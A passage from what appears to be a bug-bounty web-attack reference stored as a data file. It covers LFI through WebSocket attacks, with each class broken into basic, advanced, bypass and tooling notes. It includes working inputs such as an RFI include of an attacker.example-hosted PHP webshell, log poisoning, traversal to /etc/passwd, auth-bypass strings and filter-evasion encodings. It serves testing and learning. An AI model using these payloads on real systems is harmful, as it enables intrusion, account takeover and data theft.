"advanced": "Escalate LFI → RCE: **PHP wrappers** `php://filter/convert.base64-encode/resource=index.php` to read source; `php://input`/`data://` to include your payload; `expect://` for commands. **Log poisoning** (inject PHP into User-Agent/access logs, then include the log). **/proc/self/environ** or session files. **PHP filter chains** (php_filter_chain_generator) to craft code from filters alone. Read SSH keys, app secrets, DB creds for lateral movement.",
"bypass": "Appended extension: `php://filter` (no extension needed), wrapper tricks, or (legacy) null byte `%00`/path truncation. Traversal filters: double-encode (`%252e%252e%252f`), nested `....//`, absolute paths, or `..%2f`. Allowlist of 'pages': directory traversal out of the allowed folder. Filtered keywords: case/encoding on `etc`/`passwd`. Wrapper blacklist → try `data`/`phar`/`zip`.",
"automation": "**LFISuite**, **liffy**, and **kadimus** automate detection and RCE chains (wrappers, log poisoning). **php_filter_chains_oracle_exploit** for filter-chain RCE. Fuzz the param with LFI/traversal payload lists (SecLists) and diff for file contents. Use ffuf to enumerate readable files once a primitive works. Confirm the include actually executes vs merely reads.",
}),
("Remote File Inclusion (RFI)", "rfi", {
"overview": "RFI is LFI's remote cousin: the app includes a file from a URL you control, so your hosted script executes on the server — direct RCE. It requires the language/config to allow remote includes (e.g. PHP `allow_url_include=On`), which is rarer today but still appears in legacy apps and certain frameworks.",
"basic": "If a `?page=`-style param accepts a URL, point it at your server: `?page=http://attacker.example/shell.txt` where shell.txt holds `<?php system($_GET['c']); ?>`. Confirm your server receives the request and the payload runs. Test both `http://` and `ftp://`, and whether an extension is appended.",
"advanced": "Host a full webshell or reverse-shell stager for immediate RCE. Use `data://text/plain;base64,...` to inline the payload when remote URLs are filtered but wrappers aren't. Chain with SSRF restrictions: sometimes only internal URLs are fetched (pivot). Combine with upload of the include target if remote is blocked but local-with-known-URL is possible.",
"bypass": "Appended `.php` extension: add `?` or `#` to your URL so the suffix becomes a query/fragment (`http://attacker.example/shell.txt?`), or null byte on legacy. Filtered `http://`: try `https`, `ftp`, `data://`, or case/encoding tricks. Allowlist of hosts: open redirect on an allowed host, or `@`/`#` URL confusion. If only local wrappers are allowed, fall back to the LFI→RCE chains.",
"automation": "Same tooling as LFI (**fimap**, **kadimus**, **liffy**) covers RFI detection and shell delivery. Stand up a quick payload server (python http.server) and an interactsh listener to confirm fetches. Fuzz the param with remote-URL payloads. Verify `allow_url_include` is actually on by observing your server getting hit and the code executing.",
}),
("Directory / Path Traversal", "path-traversal", {
"overview": "Path traversal (`../`) escapes the intended directory to read (or sometimes write) arbitrary files on the server — config, source, credentials, keys. It appears in file download/read endpoints, image/asset servers, template loaders, and archive extractors. Read-only by default, but write-traversal (zip-slip, upload filename) can lead to RCE.",
"basic": "Add `../` sequences to a file parameter: `?file=../../../../etc/passwd`, Windows `..\\..\\..\\windows\\win.ini`. Adjust depth until you escape the base directory. Confirm by reading a recognisable file, then target app source, config, and secrets. Test download endpoints, `?lang=`/`?template=`, and any path-like input.",
"advanced": "Read source to find more bugs and secrets (DB creds, API keys, JWT secrets, cloud keys). Absolute-path injection when allowed. **Write traversal**: zip-slip during extraction, traversal in upload filenames to drop files in webroot/cron/ssh. Read `/proc/self/...`, container secrets, `.git`/`.env`. Combine with LFI wrappers for code execution where the language includes the file.",
"bypass": "Filtered `../`: nested `....//`, `..%2f`, double-encode `%252e%252e%252f`, unicode/overlong UTF-8 (`%c0%ae`), backslash on Windows, mixed `..\\/`. Stripped-once filters defeated by `....//`. Required prefix/suffix: insert traversal mid-path or use null byte (legacy) to cut an appended extension. Allowlisted base dir: traverse out then back in. Try absolute paths if relative is normalised.",
"automation": "**dotdotpwn** fuzzes traversal patterns across encodings and depths. **ffuf**/wfuzz with traversal + target-file wordlists (SecLists). Burp scanner and Nuclei traversal templates. After a read primitive, script enumeration of likely sensitive files. Confirm you're reading real files, not an error page that happens to 200.",
}),
("Open Redirect", "open-redirect", {
"overview": "An open redirect lets you control where the app sends the user after a redirect (`?next=`, `?return=`, `?url=`, logout/login flows). On its own it's low severity (phishing), but it's a powerful primitive in chains: stealing OAuth codes/tokens, bypassing SSRF allowlists, leaking auth via Referer, and CSP/redirect-based exfiltration.",
"basic": "Find redirect params (after login/logout, `?url=`, `?redirect=`, `?next=`). Set the value to an external domain and check for a 3xx to it or a client-side `location` change. Confirm both header-based (`Location`) and JS/meta redirects. Note whether the param is reflected into other sinks too.",
"advanced": "Use it as a chain link: capture OAuth `code`/SAML response by redirecting the callback to your host; bypass an SSRF/redirect allowlist (server follows a redirect from an allowed host to an internal target); leak tokens/Referer to your page; CRLF in the redirect for header injection. DOM-based open redirect via `location = userInput`.",
"bypass": "Allowlist/validation evasion: `//attacker.example` and `https:attacker.example` (scheme-relative), `https://allowed.example@attacker.example`, `https://attacker.example#allowed.example`, `https://attacker.example?allowed.example`, backslashes `https:/\\attacker.example`, whitelisted-substring tricks (`allowed.example.attacker.example`, `attacker.example/allowed.example`), encoded dots/slashes, and `javascript:`/`data:` schemes for DOM sinks. Subdomain you control if `*.allowed.example` is trusted.",
"automation": "**OpenRedireX** and **Oralyzer** fuzz redirect params with bypass payload lists. **gf** patterns + waybackurls to harvest redirect params at scale, then test with ffuf. Burp scanner flags many. The value is in the chain — once found, pivot to OAuth/SSRF exploitation manually.",
}),
("Host Header Injection", "host-header", {
"overview": "When an app trusts the `Host` (or `X-Forwarded-Host`) header to build absolute URLs, it can be poisoned — most damagingly in password-reset links (reset poisoning → account takeover), but also web-cache poisoning, SSRF, and routing-based access bypass. The fix is to never trust the incoming Host for security decisions.",
"basic": "Change the `Host` header (and try `X-Forwarded-Host`, `X-Host`, dupes) and watch where it surfaces: reset emails, links in the body, redirects, `Location`. Trigger a password reset and inspect whether the reset link uses your injected host. Check whether the app even validates Host or routes solely on it.",
"advanced": "**Reset poisoning**: poison the Host so the reset link points to your server; when the victim clicks, their token hits you → takeover. **Cache poisoning** when the Host/X-Forwarded-Host is reflected and cached (serve malicious content to all users — see Web Cache Poisoning). **Routing/SSRF** where the back end forwards based on Host. **Authentication/'internal' bypass** via `Host: localhost`/internal name.",
"bypass": "If `Host` is validated, try `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Host`, `Forwarded`, absolute-URL request line, or a second Host header. Inject a port or `@` to keep the allowed host while redirecting. Line-wrapping/CRLF in some stacks. Use an allowed host with an open redirect to reach your domain.",
"automation": "Burp's **Param Miner** tests Host/forwarding headers for reflection and cache poisoning. Scripts to flip Host and trigger reset emails. Nuclei host-header templates. Largely manual — confirm impact (does the poisoned link actually reach a victim, does the cache actually serve it) rather than just reflection.",
}),
("HTTP Request Smuggling", "request-smuggling", {
"overview": "Request smuggling exploits disagreement between a front-end (proxy/CDN/LB) and back-end server about where one HTTP request ends — usually via conflicting `Content-Length` and `Transfer-Encoding` headers (CL.TE, TE.CL, TE.TE). The desynced connection lets you prepend bytes to the next user's request: bypass front-end controls, capture other users' requests, poison caches, or escalate to mass compromise.",
"basic": "Test with Burp's Smuggler/Repeater 'desync' probes: send a request with both CL and TE and an ambiguous body, and detect a timing or response difference indicating one server ignored a header. Identify the variant (CL.TE, TE.CL, TE.TE) from which boundary each server honours. HTTP/2 downgrade (H2.CL/H2.TE) is increasingly the relevant vector.",
"advanced": "Once desynced: prepend a malicious prefix to the victim's next request to bypass front-end auth/routing, force them onto an attacker-chosen path, or capture their full request (cookies/CSRF tokens) by reflecting it. Cache poisoning/deception via smuggled responses. HTTP/2 → HTTP/1.1 downgrade smuggling and request tunnelling. Client-side desync. Chain to account takeover at scale.",
"bypass": "Front-ends that normalise headers: obfuscate `Transfer-Encoding` (`Transfer-Encoding : chunked`, tabs, `\\x0b`, duplicated/cased headers, `chunked\\r\\n`) so only one server parses it (TE.TE). HTTP/2 specifics: CRLF injection in H2 headers, ambiguous content-length, `:path`/`:authority` tricks. Vary chunk-size formatting. Each proxy/back-end pair needs its own obfuscation.",
"automation": "Burp's **HTTP Request Smuggler** extension (James Kettle) automates detection and exploitation, including HTTP/2 desync and probe generation; **Smuggler** (defparam) is a CLI scanner. Use Burp Repeater with 'Update Content-Length' off and the connection-reuse view. This is timing-sensitive and can affect other users — test carefully within scope.",
}),
("CRLF Injection & Response Splitting", "crlf", {
"overview": "CRLF injection inserts carriage-return/line-feed (`\\r\\n`) into a response (or request) where user input reaches headers, splitting the HTTP message. Consequences: header injection (set cookies, CORS), HTTP response splitting (inject a whole second response → XSS/cache poisoning), log injection, and SMTP/header injection in mail features.",
"basic": "Inject `%0d%0a` into params that end up in headers (redirect `Location`, `Set-Cookie`, custom headers) and check whether a new header appears in the response. e.g. `?url=%0d%0aSet-Cookie:%20x=1`. Confirm the CRLF is honoured (some stacks strip/encode it). Try single `%0a`, `%0d`, and unicode/double-encoded variants.",
"advanced": "**Response splitting**: inject `%0d%0a%0d%0a` then a crafted body to deliver reflected XSS or poison a shared cache with attacker content. Inject security-relevant headers (`Access-Control-Allow-Origin`, `Set-Cookie` for fixation, CSP removal). In requests, smuggle headers to back ends. Email header injection (BCC/From) in contact/reset features. Combine with open redirect/host header for stronger chains.",
"bypass": "Filtered `%0d%0a`: try `%0a` alone, `%0d`, double-encode `%250d%250a`, unicode (`%E5%98%8A%E5%98%8D` overlong), or `\\u2028`/`\\u2029`. Different injection points (path vs query vs header value). Where the framework normalises, target a component that builds headers manually. Some WAFs miss CR or LF individually.",
"automation": "**CRLFuzz** and **crlfsuite** fuzz parameters/paths with CRLF payload lists at scale. **gf**/waybackurls to harvest candidate params first. Burp scanner flags header-injection. Confirm impact (does an injected header actually take effect, does the cache store it) rather than mere reflection.",
}),
("Insecure Deserialization", "deserialization", {
"overview": "Deserialising attacker-controlled data in languages/libraries that reconstruct objects (Java, PHP, Python pickle, Ruby, .NET, Node) can trigger 'gadget chains' that run during object construction/cleanup — leading to RCE, or to logic tampering and auth bypass. Look for serialized blobs in cookies, hidden fields, tokens, caches, and message queues.",
"basic": "Spot serialized data: Java (`rO0AB...` base64, `\\xac\\xed` magic), PHP (`O:4:\"User\":...`), Python pickle, .NET (`AAEAAAD/...`), Ruby Marshal. Tamper a field (e.g. PHP object property like `isAdmin`) to test whether the object is trusted post-deserialisation. Confirm the data is actually deserialised (vs just parsed) before chasing RCE.",
"advanced": "RCE via gadget chains: Java (Commons-Collections, etc.) with **ysoserial**; .NET with **ysoserial.net**; PHP **POP chains** via magic methods (`__wakeup`/`__destruct`/`__toString`); Python pickle `__reduce__`; Ruby/Node gadgets. PHAR deserialisation in PHP (trigger via filesystem functions on a `phar://` path). Out-of-band confirmation, then a reverse shell. Logic-only abuse (privilege/property tampering) when no gadget exists.",
"bypass": "Filters on the magic bytes/class names: gzip/base64/wrap the blob differently, use PHAR to smuggle a PHP object through file functions, or pick a gadget in an allowlisted namespace. Length/integrity checks (HMAC'd cookies) need the secret first (see JWT/secret leakage). Use a different serialization format the endpoint also accepts. Partial/forgiving parsers tolerate trailing data.",
"automation": "**ysoserial** / **ysoserial.net** generate Java/.NET chains; **phpggc** builds PHP POP chains for common frameworks; Burp's **Java Deserialization Scanner** and **Freddy** detect and exploit. **GadgetProbe** identifies available classpath gadgets. Confirm with an out-of-band callback first, then weaponise — gadget availability is version-specific.",
}),
("XPath Injection", "xpath", {
"overview": "XPath injection targets apps that build XPath queries (over XML documents or XML databases) from user input — often XML-backed logins or search. Like SQLi, you alter query logic to bypass authentication or extract the whole XML document. There are no privilege/comment constructs like SQL, so blind extraction is the norm.",
"basic": "Probe with `'`, `\"` and watch for XPath/XML errors. Auth bypass: `' or '1'='1` or `\" or \"\"=\"`. Confirm logic changes (login succeeds, more results return). Identify whether input lands in a string literal or a node test and break out accordingly.",
"advanced": "**Blind extraction** with boolean oracles: enumerate node/attribute names and values char by char using `substring()`, `string-length()`, and `count()` — e.g. `... and substring(//user[1]/password,1,1)='a'`. **XPath 2.0** features (doc(), string functions) widen impact; sometimes OOB via `doc('http://attacker.example/')`. Dump the entire document by walking `//*` and indices.",
"bypass": "Filtered quotes: use `concat()` or numeric/position contexts that need no quotes. Blocked keywords: case isn't relevant in XPath but function-name filters can be dodged with alternative functions (`contains`, `starts-with`). Encoding around WAFs. When `or 1=1` is blocked, use position predicates (`[position()=1]`) or always-true node tests.",
"automation": "**xcat** automates blind XPath extraction (including XPath 2.0 OOB) given a true/false oracle. Burp Intruder to fuzz boolean payloads and diff responses. Build a custom `substring()` extraction script around the oracle for speed. Identify the oracle (auth success, result count) first.",
}),
("LDAP Injection", "ldap", {
"overview": "LDAP injection manipulates filters built from user input in directory-backed apps (corporate logins, address books). By injecting filter metacharacters (`*`, `(`, `)`, `&`, `|`, `\\`), you bypass authentication, enumerate the directory, or alter access decisions. Common in intranet/SSO and 'search the company directory' features.",
"basic": "Wildcard `*` in a username/search to match everything. Auth bypass: `*)(uid=*))(|(uid=*` or `admin)(&)` style filter breakouts, and `*)(|(password=*)` to ignore the password clause. Inject `)` to close the filter and `(|...` to OR in an always-true condition. Watch for 'too many results' or login success.",
"advanced": "Blind enumeration of attributes/values with boolean wildcards: `admin)(description=A*` true/false to extract char by char. Discover schema/attributes (`objectClass`, `userPassword`, `memberOf`) and group memberships for privilege mapping. AND/OR filter manipulation to flip authorization. Read sensitive attributes (phone, email, hashes) if returned.",
"bypass": "When metacharacters are partially filtered, use the ones that remain (`*` alone is powerful). Encode/escape variations (`\\2a` for `*`). Adjust the breakout to the filter's exact structure (count parentheses). Move the injection between the username and the (often unchecked) password clause. Different binds (anonymous) may widen access.",
"automation": "Mostly manual filter crafting; Burp Intruder/wfuzz to fuzz metacharacter payloads and diff result counts. Build a wildcard-oracle script for blind attribute extraction. Nuclei/SecLists provide LDAP payload lists. Confirm you're hitting an LDAP filter (errors, behaviour) rather than SQL.",
}),
("Clickjacking", "clickjacking", {
"overview": "Clickjacking (UI redress) loads the target site in a transparent/overlaid iframe so the victim's clicks land on hidden, sensitive controls (confirm payment, change settings, delete account, OAuth consent). It works when the app lacks framing protections (`X-Frame-Options` / CSP `frame-ancestors`). Low-to-medium severity, higher when it drives a one-click destructive action.",
"basic": "Try to frame the page: a minimal `<iframe src=target>`; if it renders, framing protection is missing/weak. Check response headers for `X-Frame-Options` and CSP `frame-ancestors`. Identify a sensitive single-click action to target.",
"advanced": "Overlay the iframe with opacity 0 and position a decoy button under the real control; lure the victim to click. **Drag-and-drop** and **double-click** variants. Combine with prefilled inputs (`?param=`) to set form values before the click. OAuth/permission-grant clickjacking. Chain with other bugs (e.g. clickjack a CSRF-protected action the victim's browser will authorise).",
"bypass": "Weak defences: `X-Frame-Options: ALLOW-FROM` is deprecated/ignored by many browsers; CSP with a too-broad `frame-ancestors` (or none) still frameable from listed origins; frame-busting JS defeated with the `sandbox` attribute (`<iframe sandbox=\"allow-forms\">` blocks the buster's `top.location`). Inconsistent headers across routes — find an unprotected sensitive page.",
"automation": "Burp scanner and Nuclei flag missing framing headers. **clickjacking-tester** and quick PoC HTML generators build the overlay. Verify real exploitability (a meaningful one-click action and a plausible lure), not just the missing header — many reports are downgraded for low impact.",
}),
("CORS Misconfiguration", "cors", {
"overview": "Cross-Origin Resource Sharing controls which origins may read responses via JS. Misconfigurations let a malicious site read authenticated responses (data theft) — most dangerously reflecting the request `Origin` into `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`. Affects APIs serving user data with cookie/token auth.",
"basic": "Send requests with an `Origin:` header you control and inspect the response's `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC). If ACAO reflects your arbitrary origin and ACAC is true, you can read the victim's authenticated data from your site. Also test `Origin: null` and trusted-subdomain values.",
"advanced": "Build a PoC page that fetches the API `withCredentials` and exfiltrates the response. `Origin: null` accepted → exploit via a sandboxed iframe/data URI that sends a null origin. Trusted-subdomain ACAO + an XSS/subdomain-takeover on that subdomain → full read access. Pre-flight bypass for 'simple' requests. Wildcard ACAO without credentials still leaks public-but-sensitive data.",
"bypass": "Allowlist weaknesses: prefix/suffix matching (`attacker.example` contains `target.example`? try `target.example.attacker.example` or `attackertarget.example`), unescaped-dot regex, accepting any subdomain (`*.target.example` → takeover/XSS), `null` origin acceptance, and case/port confusion. Switch to a 'simple' request to skip preflight when the dangerous header is on GET.",
"automation": "**Corsy** and **CORScanner** test reflection/null/credential combos across origins. Burp scanner flags permissive CORS. Generate the JS exfil PoC by hand to prove read access. Confirm ACAC is actually `true` and the response holds private data — wildcard-without-credentials is usually informational.",
}),
("Web Cache Poisoning & Deception", "cache-poisoning", {
"overview": "Web cache attacks abuse shared caches (CDN/reverse proxy). **Poisoning**: get the cache to store a harmful response (XSS, redirect) under a key other users share, so everyone gets your payload. **Deception**: trick the cache into storing a victim's *private* response under a URL you can fetch, leaking their data. Both hinge on the gap between what affects the response and what's in the cache key.",
"basic": "Find unkeyed inputs: add headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-For`) or params and see if they change a *cached* response while not being part of the cache key (look for `X-Cache: hit/miss`, `Age`). For deception, append a static-looking suffix (`/account.php/nonexistent.css`) and see if a private page gets cached as a static asset.",
"advanced": "Poison via an unkeyed header reflected into a sink (host-header XSS/redirect) and confirm it persists for other requests to the same key. Cache-key normalisation quirks, parameter cloaking, and fat-GET. **Deception**: path-confusion (`/profile.css`, `/profile/..%2f`, trailing `;`/`#`) to make the cache store authenticated content; then retrieve it unauthenticated. Chain with request smuggling for cross-user poisoning.",
"bypass": "Reach the cache despite normalisation: vary delimiters the cache and origin parse differently (`;`, `,`, encoded slashes), parameter pollution/cloaking to hide a keyed param, and inconsistent path normalisation between cache and origin. For deception, use extensions/paths the cache force-caches (`.css`, `.js`, `/static/`) layered onto dynamic routes.",
"automation": "Burp's **Param Miner** (Kettle) discovers unkeyed headers/params and tests poisoning automatically. **Web Cache Vulnerability Scanner (WCVS)** scans for both poisoning and deception. Always include cache-busters while probing and confirm a *second, clean* request receives the poisoned response — that's the proof of cross-user impact.",
}),
("Race Conditions", "race-conditions", {
"overview": "A race condition (TOCTOU) is when concurrent requests hit a window between a check and an action, letting you do something more times (or in a different order) than intended: redeem a coupon/gift card twice, over-withdraw, bypass a one-time limit, exceed rate limits, or create duplicate objects. Increasingly impactful in payments, vouchers, and 2FA/OTP.",
"basic": "Identify a 'limited' action (apply discount once, redeem balance, accept invite, vote once). Fire many identical requests **simultaneously** and check whether the limit is exceeded (two redemptions, negative balance). Use Burp Repeater 'send group in parallel' or Turbo Intruder with single-packet timing. Confirm the duplicate effect persisted.",
"advanced": "**Limit-overrun** (multi-redeem, over-spend). **Multi-endpoint races** (e.g. confirm-while-cancel). **Single-packet attack** (HTTP/2) to land 20-30 requests within ~1ms and beat tight windows. State-machine races (apply action during a transient state). Combine with logic flaws — race the email-verification or 2FA step. Object-creation races (duplicate accounts/usernames).",
"bypass": "Tighten timing to fit the window: HTTP/2 single-packet attack to remove network jitter; warm the connection; align requests so they arrive together. If rate-limited, distribute or use the single-packet burst (counts as near-simultaneous). Last-byte synchronisation in Turbo Intruder. Find the narrowest check-to-commit gap and target it.",
"automation": "**Turbo Intruder** (single-packet attack script) and Burp Repeater's **parallel send group** are the standard tools for sub-millisecond bursts. Build a small async script (Python `asyncio`/`httpx`) for custom multi-endpoint races. Confirm by observing the over-limit side effect; re-run a few times since races are probabilistic.",
}),
("Business Logic Flaws", "business-logic", {
"overview": "Business-logic flaws are abuses of legitimate functionality where the *rules* are wrong or unenforced server-side — negative quantities, price/total tampering, skipping required steps, abusing workflows, or unintended feature combinations. No injection needed; they're found by understanding the application's intent and where the server trusts the client.",
"basic": "Model each workflow (purchase, transfer, signup, redeem) and ask 'what if I break the assumption?': negative/zero/huge quantities, change the price/currency/total in the request, reuse a one-time code, reorder or skip steps, replay a final 'confirm' without the prerequisites. Tamper hidden fields and client-side validated values.",
"advanced": "Chain steps the server checks independently (pay $0 then confirm; apply many stacked coupons; convert currency favourably with rounding). Abuse refunds/cancellations to net value. Exploit trust boundaries (client sets discount/role/tier). Time-of-use vs time-of-grant (subscriptions). Combine with race conditions for limit overruns, or with IDOR to act on others' objects. Quantity/price/rounding edge cases at scale.",
"bypass": "There's no signature to defeat — the 'bypass' is finding the unguarded assumption: validation only in the UI/JS, checks on step 1 but not step 3, server recomputing from client-supplied subtotals, or feature flags toggled by client params. Use parameter pollution, hidden/extra fields (mass assignment), and replaying intermediate-state requests.",
"automation": "Largely manual and creative. Tooling assists: Burp Repeater/Intruder to tamper values, **mass-assignment**/param miners to find hidden fields, and scripts to drive multi-step flows. Map the state machine, then test each transition's server-side enforcement. Document the exact steps — logic bugs need clear repro to be accepted.",
}),
("Information Disclosure", "info-disclosure", {
"overview": "Information disclosure is the app leaking data useful to an attacker: secrets (keys, creds, tokens), source code, internal paths/IPs, stack traces, debug pages, version info, PII, and backup/VCS files. Often a finding in itself (exposed `.env`, `.git`) and a force-multiplier for other attacks. Recon-heavy and frequently rewarded in bug bounties.",
"basic": "Check the obvious: `/.git/`, `/.env`, `/.svn`, backup files (`.bak`,`~`,`.old`,`.zip`), `/server-status`, `phpinfo.php`, `robots.txt`/`sitemap.xml`, source maps (`.js.map`), HTML/JS comments, verbose error pages and stack traces. Inspect JS bundles for hardcoded API keys/endpoints. Trigger errors (bad input, wrong type) to surface debug detail and tech/version.",
"advanced": "Dump source via exposed `/.git/` (git-dumper) or source maps; mine it for secrets and new endpoints. Find secrets in JS, mobile apps, CI artifacts, and public repos/Wayback history. Internal hostnames/IPs from headers, errors, redirects, and metadata. Stack traces revealing framework/path for targeted exploits. Aggregate small leaks (versions + paths + params) into an exploit chain.",
"bypass": "Access 'protected' artefacts via case/encoding tricks, path traversal, cache deception, or an api-version/route that skips controls. Retrieve removed-but-cached content from Wayback/Google cache. When a file is blocked by extension, try alternate extensions/case or the directory listing. Use a different host/CDN edge that serves stale config.",
"automation": "**gitdumper**/**git-dumper**, **trufflehog**/**gitleaks** (secret scanning), **LinkFinder**/**SecretFinder** (JS endpoint/secret mining), **gau**/**waybackurls** (historical URLs), Nuclei exposure templates, and dir brute-forcing (ffuf/feroxbuster + SecLists). Triage: confirm the secret is live and in scope before reporting.",
}),
("Security Misconfiguration", "misconfiguration", {
"overview": "Security misconfiguration is the catch-all for insecure defaults and sloppy setup: default credentials, unnecessary features/ports/services enabled, directory listing, verbose errors/debug mode in prod, missing security headers, over-permissive cloud storage, exposed admin/management interfaces, and outdated components. Extremely common and often easy, high-value findings.",
"basic": "Enumerate exposed surfaces: admin panels, actuator/metrics/health (`/actuator`, `/debug`, `/console`), default creds on devices/apps, directory listing, and missing security headers (HSTS, CSP, X-Content-Type-Options). Check for debug/stack traces in prod, open cloud buckets, and management ports. Fingerprint versions to flag outdated/EoL components.",
"advanced": "Exploit exposed framework consoles (Spring Boot Actuator `/env`/`/heapdump`, Django debug, Werkzeug console PIN, Jolokia) for secrets/RCE. Open S3/GCS/Azure buckets (list/read/write). Misconfigured CI/CD, dashboards (Kibana/Grafana/Jenkins) and DBs (Mongo/Redis/Elasticsearch) with no auth. Default creds → admin → RCE. Chain version disclosure with known CVEs.",
"bypass": "Reach 'internal' management endpoints via header trust (`X-Forwarded-For: 127.0.0.1`), path tricks, or a different vhost. Default-deny missed on one route/method. Cloud bucket region/endpoint variants. Use an old api version or staging host that still runs debug mode. Authentication present on the UI but not the underlying API.",
"automation": "**Nuclei** (huge misconfig/exposure template set), **nmap** scripts, **wafw00f**, **testssl.sh**, cloud tools (**S3Scanner**, **cloud_enum**), and security-header scanners. Dir/vhost brute-forcing to find management UIs. Fingerprint with Wappalyzer/whatweb then map versions to CVEs. Validate each hit manually and confirm it's in scope.",
}),
("Subdomain Takeover", "subdomain-takeover", {
"overview": "A subdomain takeover happens when a DNS record (usually CNAME) points to a third-party service (GitHub Pages, S3, Heroku, Azure, etc.) that has been deprovisioned, so an attacker can register that resource and serve content on the victim's subdomain. Impact: phishing on a trusted domain, cookie/OAuth theft, CSP/SSO bypass, and credibility for further attacks.",
"basic": "Enumerate subdomains, resolve their CNAMEs, and look for ones pointing to external services with a 'not found'/'no such bucket'/'no such app' fingerprint. Match the response/error against known takeover signatures (the can-i-take-over-xyz list). Confirm the dangling target is actually claimable on that provider.",
"advanced": "Claim the resource on the provider and serve content to prove control (a benign marker). Weaponise: host phishing or a page that steals cookies scoped to `.victim.com`, capture OAuth redirects allow-listed to the subdomain, bypass CORS/CSP that trust `*.victim.com`, or set/overwrite domain-scoped cookies. NS-record and second-order takeovers (a subdomain referenced by another app).",
"bypass": "Not a filter-bypass class — the work is thorough discovery: passive + active subdomain enumeration, historical DNS (SecurityTrails/Wayback), and catching transient dangling records (services freed but DNS not cleaned up). Wildcard DNS and provider-specific claim quirks. Re-check periodically — records go stale over time.",
"automation": "Enumerate with **subfinder**/**amass**/**assetfinder**, resolve with **dnsx**/**massdns**, then fingerprint with **subjack**, **subzy**, **nuclei** (takeover templates), or **can-i-take-over-xyz** signatures. Automate periodic monitoring of your scope's CNAMEs. Always actually claim-and-prove (benign PoC) rather than reporting a mere fingerprint match — providers vary.",
}),
("GraphQL Attacks", "graphql", {
"overview": "GraphQL exposes a single typed endpoint where clients shape queries. Security issues: introspection leaking the full schema, missing object/field-level authorization (IDOR/BFLA over nodes), injection passed to resolvers, batching/aliasing to defeat rate limits, and denial of service via deeply nested/recursive queries. The flexible query model widens the attack surface versus REST.",
"basic": "Find the endpoint (`/graphql`, `/api/graphql`, `/v1/graphql`) and run **introspection** (`__schema`) to dump types, queries, mutations, and fields. If introspection is disabled, use field suggestions/clairvoyance. Enumerate sensitive queries/mutations and try calling privileged ones directly. Test object ids for IDOR over `node(id:)`.",
"advanced": "**Authorization gaps**: call admin mutations or read other users' objects (BOLA/BFLA) since authz is often only on the gateway, not per-resolver. **Injection** into resolvers (SQL/NoSQL/OS) via arguments. **Batching/aliasing** to brute-force (many login attempts in one request) bypassing rate limits and sometimes 2FA. **DoS** via deeply nested/circular queries. Mutation chaining and mass-assignment via input objects.",
"bypass": "Introspection disabled → **clairvoyance**/field-stuffing to recover the schema from error suggestions. Rate limits → alias batching (`a:login(...) b:login(...)`) or array batching to send many operations per request. WAFs → query via GET vs POST, `application/json` vs form, variables vs inline, and whitespace/alias obfuscation. Persisted-query allowlists sometimes bypassable via the non-persisted path.",
"automation": "**InQL** (Burp), **graphw00f** (engine fingerprint), **clairvoyance** (schema recovery without introspection), **GraphQLmap**/**graphql-cop** for injection and misconfig testing, and **batchql** for batching attacks. Pull the schema first, then drive targeted authz/injection tests. Confirm authorization findings with two accounts.",
}),
("API Abuse & Mass Assignment", "api-abuse", {
"overview": "Modern REST/JSON APIs concentrate logic and data, making them prime targets (OWASP API Top 10). Beyond object/function-level authz (covered in IDOR/Access Control), key issues include **mass assignment** (binding client fields you shouldn't, e.g. `isAdmin`), excessive data exposure, missing rate limits, and unguarded internal/extra parameters.",
"basic": "Capture API requests and read the docs/schema (Swagger/OpenAPI at `/swagger.json`, `/openapi.json`, `/api-docs`). For mass assignment, add fields the UI doesn't send (`\"role\":\"admin\"`, `\"verified\":true`, `\"balance\":9999`, `\"id\":...`) to create/update calls and see if they stick. Look for endpoints returning more data than the UI shows (excessive exposure).",
"advanced": "Mass-assign privilege/ownership at registration or profile update for escalation. Abuse undocumented/legacy `/v1` endpoints and HTTP methods. Excessive data exposure — pull full objects and filter client-side reveals secrets. Param mining surfaces hidden behaviours (debug flags, internal toggles). Combine with BOLA/BFLA for full account/data takeover. Inconsistent validation across versions.",
"bypass": "When a field is stripped, try nested objects (`user[role]`), arrays, alternate casing/aliases, JSON vs form encoding, and parameter pollution. Reach mass-assignable sinks via a different (older/internal) endpoint or method. Content-type confusion to dodge schema validation. Supply trusted ids/owners directly in the body.",
"automation": "**Arjun**/**param-miner** discover hidden parameters; import OpenAPI into Postman/Burp to exercise every endpoint; **Autorize** for authz; Nuclei API templates. Fuzz JSON bodies with privilege/ownership fields and diff outcomes. Scrape Swagger to auto-build the request set, then test mass assignment and exposure systematically.",
}),
("Prototype Pollution", "prototype-pollution", {
"overview": "Prototype pollution (JavaScript) injects properties into `Object.prototype` via `__proto__`/`constructor.prototype`, so every object inherits attacker-controlled defaults. **Server-side** (Node) it can reach gadgets for RCE, auth bypass, or DoS; **client-side** it can lead to DOM XSS. Found in unsafe recursive merge/clone/`extend`, query/JSON parsing, and config handling.",
"basic": "Send keys like `__proto__[polluted]=yes` (query/body) or JSON `{\"__proto__\":{\"polluted\":\"yes\"}}` to merge/assign endpoints, then check whether an unrelated object now has `polluted` (e.g. reflected in a response, a changed default, or `Object.prototype.polluted` in client JS). `constructor.prototype` is the alternate vector.",
"advanced": "**Client-side** → DOM XSS by polluting properties a sink reads (e.g. a gadget that builds HTML/script from a config default). **Server-side** → set properties that downstream code trusts: inject into template options (e.g. pollute to enable an SSTI/EJS gadget for RCE), spoof auth flags, or alter security defaults. DoS by polluting prototype methods. Chain pollution → gadget for impact.",
"bypass": "If `__proto__` is filtered, use `constructor.prototype` or `constructor][prototype]`; for deep keys, nested notation (`a[__proto__][b]`). JSON parsers that block `__proto__` may miss `constructor`. Array vs object key handling. Different parameter formats (querystring vs JSON vs form). Locate a real gadget — pollution alone is often informational without an exploitable sink.",
"automation": "Client-side: **DOM Invader** (Burp) has a prototype-pollution mode that finds sources and gadgets automatically; **ppmap** and **pphack** scan for it. Server-side: **Server-Side Prototype Pollution Scanner** (Burp). Use known gadget lists (PortSwigger) to turn pollution into RCE/XSS. Always prove a concrete sink/gadget, not just that the property sticks.",
}),
("WebSocket Attacks", "websockets", {
"overview": "WebSockets (`ws://`/`wss://`) provide a persistent bidirectional channel often used for chat, live data, and notifications. Security gaps: **Cross-Site WebSocket Hijacking (CSWSH)** when the handshake relies only on cookies with no origin check or CSRF token, plus injection/IDOR/authz flaws in the messages themselves, which frequently skip the validation HTTP routes enforce.",
